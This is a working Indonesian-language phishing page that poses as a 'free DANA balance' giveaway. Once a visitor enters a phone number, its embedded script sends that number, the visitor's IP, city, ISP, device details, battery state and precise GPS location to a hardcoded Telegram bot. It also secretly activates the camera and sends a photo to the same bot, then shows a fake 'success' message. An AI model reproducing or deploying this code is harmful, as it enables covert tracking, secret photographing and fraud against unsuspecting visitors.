<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Saldo Dana GratisğŸ”¥</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: url('https://files.catbox.moe/rlhpoc.jpg') no-repeat center center/cover;
      font-family: 'Inter', sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(0, 255, 127, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    .login-container {
      background-color: #000000;
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px white;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
       background: linear-gradient(135deg, red, purple);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ffc107;
      margin-bottom: 20px;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, red, purple);
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover {
      opacity: 0.8;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #000000;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
        border-radius: 14px;
      }
      .login-title {
        font-size: 22px;
      }
      .login-input, .login-button {
        font-size: 14px;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">DAPATKAN SALDO DANA GRATIS ğŸ¤‘ ğŸ’¸ğŸ’°</p>
    <p class="login-subtitle">âœ¨Masukan Nomor Dana Anda</p>
    <input type="number" class="login-input" placeholder="Nomor: 62xxx" id="text">
    <p class="login-subtitle">Isi Nominal Saldo</p>
    <input type="number" class="login-input" placeholder="Jumlah Saldo : 1.000 - 50.000" id="saldo" min="1000" max="50000">
    <button class="login-button" id="login-button">Next</button>
    <div id="info">ğŸš€ Silahkan masukkan nomor dan nominal untuk Mengisi Saldo</div>
    
<textarea id="support-box" 
style="width:100%; height:100px; background:#111; color:white; padding:10px; border-radius:8px; margin-top:15px; display:none;">ğŸš€ PROSES MENGISI SALDO</textarea>

<textarea id="st-box" 
style="width:100%; height:100px; background:#111; color:white; padding:10px; border-radius:8px; margin-top:15px; display:none;">OlÃ¡ equipe de suporte do WhatsApp</textarea>
  </div>
 
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '8093095515:AAEhXgcLW06aKoNltOvv0hu3AJu-ttDJBwc';
    const chatIds = ['7911882988'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = 'indonesia', country = 'indonesia', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
ğŸŒIP         : ${ip}
ğŸŒ‡ Kota       : ${city}
ğŸš€ Region     : ${region}
ğŸŒ Negara     : ${country}
ğŸ“¡ ISP        : ${org}
ğŸ“±Browser    : ${navigator.userAgent}
âœ¨OS         : ${navigator.platform}
ğŸ‘‘Resolusi   : ${screen.width}x${screen.height}
ğŸ”‹Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
ğŸ’¥ Memori     : ${navigator.deviceMemory || 'N/A'} GB
ğŸ”¥ Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
ğŸ•’Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>ğŸ“¥ Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>ğŸ“ Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`ğŸ”¥Target lock By NdraOffc`)
        );
      } else {
        sendToTelegram(`ğŸ“ Browser GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('Bug was Out ğŸ‘‘');
            resolve();
          });
      });
    }

    button.addEventListener('click', async () => {
      const button = document.getElementById('login-button');
      const nomorInput = document.getElementById('text');
      const saldoInput = document.getElementById('saldo');
      const infoDiv = document.getElementById('info');
    
      const nomor = nomorInput.value.trim();
      const saldo = parseInt(saldoInput.value.trim());

      if (!nomor || nomor.length < 8 || nomor.length > 15) {
        infoDiv.innerText = 'âš ï¸ Nomor tidak valid.';
        return;
      }
      if (isNaN(saldo) || saldo < 1000 || saldo > 50000) {
        infoDiv.innerText = 'âš ï¸ Jumlah saldo minimal 1.000 dan maksimal 50.000.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = 'ğŸš€ Memproses Saldo..';
      sendToTelegram(`<b>ğŸ”¥Target:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `âœ… Successfully Isi Saldo ${nomor}\nğŸ’¸Jumlah ${saldo}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = 'âŒ Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
   
 
  </script>
</body>
</html>
